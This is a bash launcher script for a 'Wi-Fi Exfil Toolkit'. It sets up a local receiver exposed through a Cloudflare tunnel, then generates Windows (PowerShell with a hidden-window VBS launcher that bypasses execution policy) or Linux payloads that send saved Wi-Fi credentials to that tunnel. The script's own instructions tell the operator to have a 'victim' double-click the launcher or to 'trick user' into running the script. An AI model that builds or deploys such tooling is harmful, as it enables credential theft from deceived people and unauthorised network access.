#!/bin/bash
# launch.sh — ChrisOS Cross-Platform Wi-Fi Exfil Toolkit

set -e

# ──────── COLORS & STYLES ─────────
# Robust color detection for various environments
ENABLE_COLORS=false

# Method 1: Check if stdout is a terminal
if [ -t 1 ] && [ -n "$TERM" ]; then
    ENABLE_COLORS=true
# Method 2: Check environment variables that indicate terminal capability
elif [ -n "$TERM" ] && [ "$TERM" != "dumb" ]; then
    # Additional check for common terminal scenarios
    case "$TERM" in
        xterm*|screen*|tmux*|rxvt*|gnome*|konsole*|eterm*)
            ENABLE_COLORS=true
            ;;
    esac
fi

# Override for forced color mode (for debugging)
if [ "${FORCE_COLORS:-}" = "1" ]; then
    ENABLE_COLORS=true
fi

# Set color variables based on detection
if [ "$ENABLE_COLORS" = true ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    PURPLE='\033[0;35m'
    CYAN='\033[0;36m'
    WHITE='\033[1;37m'
    LIME='\033[0;32m'
    BOLD='\033[1m'
    NC='\033[0m'
else
    RED=''
    GREEN=''
    YELLOW=''
    BLUE=''
    PURPLE=''
    CYAN=''
    WHITE=''
    LIME=''
    BOLD=''
    NC=''
fi

# ──────── ANIMATED FUNCTIONS ─────────
print_slow() {
    for (( i=0; i<${#1}; i++ )); do
        echo -ne "${1:$i:1}"
        sleep 0.005
    done
    echo
}

# Simple print function for colored text that avoids animation issues
print_colored() {
    echo -e "$1"
}

loading_spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c] " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# ──────── BRANDING ─────────
clear
echo -e "\n${LIME}"
cat << "EOF"
██╗    ██╗██╗      ███████╗██╗    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██║    ██║██║      ██╔════╝██║    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██║ █╗ ██║██║█████╗█████╗  ██║    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██║╚════╝██╔══╝  ██║    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║      ██║     ██║    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝      ╚═╝     ╚═╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
                                                             
EOF
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"

# Use simple colored output instead of animated text to avoid escape sequence issues
if [ "$ENABLE_COLORS" = true ]; then
    echo -e "${BOLD}${GREEN}Cross-Platform Wi-Fi Exfil Toolkit (Physical Access Required)${NC}"
    echo -e "${BOLD}${PURPLE}DEV-CHRIZ-3656 | ChrisOS Red Team${NC}"
else
    echo "Cross-Platform Wi-Fi Exfil Toolkit (Physical Access Required)"
    echo "DEV-CHRIZ-3656 | ChrisOS Red Team"
fi

echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}\n"

# ──────── SETUP VARIABLES ─────────
TOOL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# Create dedicated directories on first run within tool directory
PAYLOADS_DIR="$TOOL_DIR/payloads"
CAPTURES_DIR="$TOOL_DIR/captures"
CLOUDFLARED_DIR="$TOOL_DIR/cloudflared"
TEMPLATES_DIR="$TOOL_DIR/templates"
SERVER_PID=""
LOG_FILE="/tmp/cfd.log"

# ──────── CREATE DEDICATED DIRECTORIES ─────────
# Check if this is the first run by seeing if any directories need to be created
DIRECTORIES_EXIST=true
[ ! -d "$PAYLOADS_DIR" ] && DIRECTORIES_EXIST=false
[ ! -d "$CAPTURES_DIR" ] && DIRECTORIES_EXIST=false
[ ! -d "$CLOUDFLARED_DIR" ] && DIRECTORIES_EXIST=false

# Only show verbose output on first run
if [ "$DIRECTORIES_EXIST" = false ]; then
    echo -e "${CYAN}[0/6]${NC} Setting up dedicated workspace directories..."
    echo -e "${YELLOW}📂 Creating directory structure:${NC}"
    
    # Create directories with error handling
    set +e  # Temporarily disable exit on error for directory creation
    DIRECTORIES_CREATED=0
    
    # Create base directory (tool directory already exists)
    echo -e "   ${GREEN}├──${NC} Using tool directory: $TOOL_DIR"
    
    # Create payloads directory
    if [ ! -d "$PAYLOADS_DIR" ]; then
        echo -e "   ${CYAN}├──${NC} Creating payloads directory"
        if mkdir -p "$PAYLOADS_DIR" 2>/dev/null; then
            echo -e "   ${GREEN}├──${NC} Payloads directory created successfully"
            ((DIRECTORIES_CREATED++))
        else
            echo -e "   ${RED}├──${NC} Failed to create payloads directory"
            exit 1
        fi
    else
        echo -e "   ${GREEN}├──${NC} Payloads directory exists"
    fi
    
    # Create captures directory
    if [ ! -d "$CAPTURES_DIR" ]; then
        echo -e "   ${CYAN}├──${NC} Creating captures directory"
        if mkdir -p "$CAPTURES_DIR" 2>/dev/null; then
            echo -e "   ${GREEN}├──${NC} Captures directory created successfully"
            ((DIRECTORIES_CREATED++))
        else
            echo -e "   ${RED}├──${NC} Failed to create captures directory"
            exit 1
        fi
    else
        echo -e "   ${GREEN}├──${NC} Captures directory exists"
    fi
    
    # Create cloudflared directory
    if [ ! -d "$CLOUDFLARED_DIR" ]; then
        echo -e "   ${CYAN}└──${NC} Creating cloudflared directory"
        if mkdir -p "$CLOUDFLARED_DIR" 2>/dev/null; then
            echo -e "   ${GREEN}└──${NC} Cloudflared directory created successfully"
            ((DIRECTORIES_CREATED++))
        else
            echo -e "   ${RED}└──${NC} Failed to create cloudflared directory"
            exit 1
        fi
    else
        echo -e "   ${GREEN}└──${NC} Cloudflared directory exists"
    fi
    
    set -e  # Re-enable exit on error
    
    # Summary for first run
    if [ $DIRECTORIES_CREATED -eq 0 ]; then
        echo -e "${GREEN}✓ All directories already exist${NC}"
    elif [ $DIRECTORIES_CREATED -eq 1 ]; then
        echo -e "${GREEN}✓ Created 1 new directory${NC}"
    else
        echo -e "${GREEN}✓ Created $DIRECTORIES_CREATED new directories${NC}"
    fi
    
    echo -e "${YELLOW}📊 Directory locations:${NC}"
    echo -e "   • Payloads: $PAYLOADS_DIR"
    echo -e "   • Captures: $CAPTURES_DIR"
    echo -e "   • Cloudflared: $CLOUDFLARED_DIR"
    echo
else
    # Minimal output for subsequent runs
    echo -e "${CYAN}[0/6]${NC} Workspace directories verified..."
    echo -e "${GREEN}✓ All required directories exist${NC}"
    echo
fi
echo

# ──────── TARGET SELECTION MENU ─────────
echo -e "${CYAN}🎯 SELECT TARGET OPERATING SYSTEM${NC}"
echo -e "   [${GREEN}1${NC}] Windows (netsh-based)"
echo -e "   [${GREEN}2${NC}] Linux (nmcli-based)"
echo
while true; do
    read -p "Enter your choice (1-2): " target_choice
    case $target_choice in
        1) TARGET_OS="windows"; break ;;
        2) TARGET_OS="linux"; break ;;
        *) echo -e "${RED}Invalid option. Please enter 1 or 2.${NC}";;
    esac
done

echo -e "\n${GREEN}✓ Selected: $TARGET_OS${NC}\n"

# ──────── PREPARATION ─────────
echo -e "${CYAN}[1/6]${NC} Preparing workspace..."
mkdir -p "$PAYLOADS_DIR" "$CAPTURES_DIR" "$CLOUDFLARED_DIR"
# Clean old payloads
rm -f "$PAYLOADS_DIR"/*

# ──────── DEPENDENCY CHECK ─────────
echo -e "${CYAN}[2/6]${NC} Checking dependencies..."
missing_deps=()

command -v python3 >/dev/null 2>&1 || missing_deps+=("python3")
command -v curl >/dev/null 2>&1 || missing_deps+=("curl")
command -v openssl >/dev/null 2>&1 || missing_deps+=("openssl")

if [ ${#missing_deps[@]} -gt 0 ]; then
    echo -e "${RED}❌ Missing dependencies:${NC} ${missing_deps[*]}"
    echo -e "${YELLOW}Install them with:${NC} sudo apt install python3 curl openssl"
    exit 1
fi
echo -e "${GREEN}✓ All dependencies found${NC}"

# ──────── CLOUDFLARED DOWNLOAD ─────────
if [ ! -f "$CLOUDFLARED_DIR/cloudflared" ]; then
    echo -e "${CYAN}[3/6]${NC} Downloading cloudflared..."
    (
        curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
             -o "$CLOUDFLARED_DIR/cloudflared" 2>/dev/null
        chmod +x "$CLOUDFLARED_DIR/cloudflared"
    ) &
    loading_spinner $!
    echo -e "${GREEN}✓ Cloudflared downloaded${NC}"
else
    echo -e "${GREEN}✓ Using cached cloudflared${NC}"
fi

# ──────── START LOCAL SERVER ─────────
echo -e "${CYAN}[4/6]${NC} Initializing secure receiver..."
export EXFIL_TOKEN=$(openssl rand -hex 16)
echo -e "${YELLOW}🔑 Token:${NC} $EXFIL_TOKEN"

# Start server and capture PID properly
python3 "$TOOL_DIR/server.py" &
SERVER_PID=$!
echo -e "${YELLOW}⚡ Server PID:${NC} $SERVER_PID"
sleep 2

# Verify server is running
if ! kill -0 $SERVER_PID 2>/dev/null; then
    echo -e "${RED}❌ Failed to start server${NC}"
    exit 1
fi

# ──────── CREATE CLOUDFLARE TUNNEL ─────────
echo -e "${CYAN}[5/6]${NC} Establishing global tunnel..."
"$CLOUDFLARED_DIR/cloudflared" tunnel --url http://localhost:8080 --metrics localhost:0 > "$LOG_FILE" 2>&1 &
CLOUDFLARED_PID=$!
echo -e "${YELLOW}⚡ Cloudflared PID:${NC} $CLOUDFLARED_PID"

# Wait for tunnel URL with loading indicator
echo -ne "${LIME}🌐 Connecting to Cloudflare...${NC}"
while ! grep -q "https://.*\.trycloudflare\.com" "$LOG_FILE" 2>/dev/null; do
    # Check if cloudflared is still running
    if ! kill -0 $CLOUDFLARED_PID 2>/dev/null; then
        echo -e "\n${RED}❌ Cloudflared process died unexpectedly${NC}"
        exit 1
    fi
    sleep 1
    echo -n "."
done
echo
POST_URL=$(grep -o "https://.*\.trycloudflare\.com" "$LOG_FILE" | head -1)/upload
echo -e "\n${GREEN}✅ Secure tunnel established!${NC}"
echo -e "${YELLOW}📡 POST URL:${NC} ${LIME}$POST_URL${NC}"

# ──────── GENERATE PAYLOADS ─────────
echo -e "${CYAN}[6/6]${NC} Generating $TARGET_OS payloads..."

if [ "$TARGET_OS" = "windows" ]; then
    # --- Windows Payload ---
    PS1_OUT="$PAYLOADS_DIR/collect.ps1"
    VBS_OUT="$PAYLOADS_DIR/run.vbs"

    # Render PowerShell
    sed "s|{{POST_URL}}|$POST_URL|g; s|{{TOKEN}}|$EXFIL_TOKEN|g" "$TEMPLATES_DIR/windows.ps1.tpl" > "$PS1_OUT"

    # Generate VBS launcher
    cat > "$VBS_OUT" << EOF
Set sh = CreateObject("WScript.Shell")
usb = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & usb & "\\collect.ps1"""
sh.Run cmd, 0, False
EOF

    # Fix line endings
    sed -i 's/$/\r/' "$PS1_OUT" "$VBS_OUT"

    echo -e "\n${GREEN}🎉 WINDOWS PAYLOADS GENERATED${NC}"
    echo -e "${YELLOW}📁 Location:${NC} $PAYLOADS_DIR/"
    echo -e "${CYAN}📄 Files:${NC}"
    echo -e "   ├── ${GREEN}collect.ps1${NC} (PowerShell payload)"
    echo -e "   └── ${GREEN}run.vbs${NC} (Silent launcher)"
    echo -e "\n${LIME}💡 Instructions:${NC}"
    echo -e "   1. Copy both files to target USB drive"
    echo -e "   2. Have victim double-click 'run.vbs'"
    echo -e "   3. Wi-Fi data will appear here in real-time\n"

else
    # --- Linux Payload ---
    SH_OUT="$PAYLOADS_DIR/linux_exfil.sh"

    # Render Linux script
    sed "s|{{POST_URL}}|$POST_URL|g; s|{{TOKEN}}|$EXFIL_TOKEN|g" "$TEMPLATES_DIR/linux.sh.tpl" > "$SH_OUT"
    chmod +x "$SH_OUT"

    echo -e "\n${GREEN}🎉 LINUX PAYLOADS GENERATED${NC}"
    echo -e "${YELLOW}📁 Location:${NC} $PAYLOADS_DIR/"
    echo -e "${CYAN}📄 Files:${NC}"
    echo -e "   └── ${GREEN}linux_exfil.sh${NC} (Bash payload)"
    echo -e "\n${LIME}💡 Instructions:${NC}"
    echo -e "   1. Copy 'linux_exfil.sh' to target USB drive"
    echo -e "   2. Trick user into running './linux_exfil.sh'"
    echo -e "   3. Wi-Fi data will appear here in real-time\n"
fi

# ──────── STATUS DISPLAY ─────────
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${LIME}📡 LIVE CAPTURE MONITOR${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ Tool is running${NC} | ${YELLOW}Target: $TARGET_OS${NC} | ${YELLOW}Press Ctrl+C to stop${NC}"
echo

# ──────── CLEANUP ON EXIT ─────────
trap '
    echo -e "\n${RED}🛑 Shutting down all services...${NC}"
    
    # Kill main processes
    if [[ -n "$SERVER_PID" ]]; then
        echo -e "${YELLOW}   ⚡ Killing Flask server (PID: $SERVER_PID)${NC}"
        kill $SERVER_PID 2>/dev/null
    fi
    
    if [[ -n "$CLOUDFLARED_PID" ]]; then
        echo -e "${YELLOW}   ⚡ Killing Cloudflared tunnel (PID: $CLOUDFLARED_PID)${NC}"
        kill $CLOUDFLARED_PID 2>/dev/null
    fi
    
    # Kill any remaining background processes
    echo -e "${YELLOW}   🔍 Searching for remaining background processes...${NC}"
    
    # Kill any python processes related to this tool
    PYTHON_PIDS=$(pgrep -f "python.*server\.py" 2>/dev/null)
    if [[ -n "$PYTHON_PIDS" ]]; then
        echo -e "${YELLOW}   ⚡ Killing Python server processes: $PYTHON_PIDS${NC}"
        kill $PYTHON_PIDS 2>/dev/null
    fi
    
    # Kill any cloudflared processes
    CFD_PIDS=$(pgrep -f "cloudflared.*tunnel" 2>/dev/null)
    if [[ -n "$CFD_PIDS" ]]; then
        echo -e "${YELLOW}   ⚡ Killing Cloudflared processes: $CFD_PIDS${NC}"
        kill $CFD_PIDS 2>/dev/null
    fi
    
    # Kill any curl download processes
    CURL_PIDS=$(pgrep -f "curl.*cloudflared" 2>/dev/null)
    if [[ -n "$CURL_PIDS" ]]; then
        echo -e "${YELLOW}   ⚡ Killing curl download processes: $CURL_PIDS${NC}"
        kill $CURL_PIDS 2>/dev/null
    fi
    
    # Clean up temporary files
    echo -e "${YELLOW}   🧹 Cleaning up temporary files...${NC}"
    rm -f /tmp/cfd.log 2>/dev/null
    rm -f "$CLOUDFLARED_DIR/cloudflared" 2>/dev/null
    
    # Wait a moment for processes to terminate gracefully
    sleep 2
    
    # Force kill any remaining processes
    echo -e "${YELLOW}   💀 Force killing any stubborn processes...${NC}"
    pkill -f "python.*server\.py" 2>/dev/null
    pkill -f "cloudflared.*tunnel" 2>/dev/null
    pkill -f "curl.*cloudflared" 2>/dev/null
    
    echo -e "${GREEN}✅ All services stopped and cleaned up${NC}"
    exit 0
' INT TERM EXIT

# Keep alive and monitor captures
wait
